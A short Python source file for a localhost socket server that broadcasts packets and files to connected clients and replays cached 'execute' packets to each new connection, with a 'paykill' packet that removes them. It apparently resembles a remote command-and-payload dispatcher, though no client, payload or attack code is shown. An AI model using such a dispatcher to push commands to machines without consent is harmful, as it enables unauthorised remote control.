from socketHelpers.server import ConnectionServer
from socketHelpers.server import Connection as C
from socketHelpers.packet import Packet


RECEIVE_BUFFER = 4096


class Conection1(C):
    def send_file(self, file, name):
        with open(file, "rb") as f:
            self.send(Packet("new_file", name))

            while True:
                chunk = f.read(RECEIVE_BUFFER-16)
                if not chunk: break
                p = Packet("file_data", chunk)
                self.send(p)

    def handle(self, packet):
        if packet.id == b'ping':
            return
        print(packet)

class DispatchServer(ConnectionServer):
    CONNECTION = Conection1
    distribute_cache = {}

    def copy(self):
        return super().copy()

    def connect_event(self, con):
        for i in self.distribute_cache:
            con.send(self.distribute_cache[i])

    def distribute_packet(self, packet):
        if packet.get_id() == "paykill":
            self.distribute_cache.pop(("execute", packet.read()), None)
            return super().distribute_packet(packet)
            
        self.distribute_cache[(packet.get_id(), packet.read().split(" ")[0])] = packet
        return super().distribute_packet(packet)

    def distribute_file(self, file, name):
        with open(file, "rb") as f:
            for i in self:
                i.send(Packet("new_file", name))

            while True:
                chunk = f.read(RECEIVE_BUFFER-16)
                if not chunk: break
                p = Packet("file_data", chunk)
                for i in self:
                    i.send(p)



if __name__ == '__main__':
    c = DispatchServer("localhost", 2000)
    print(c.copy())
    c.start()
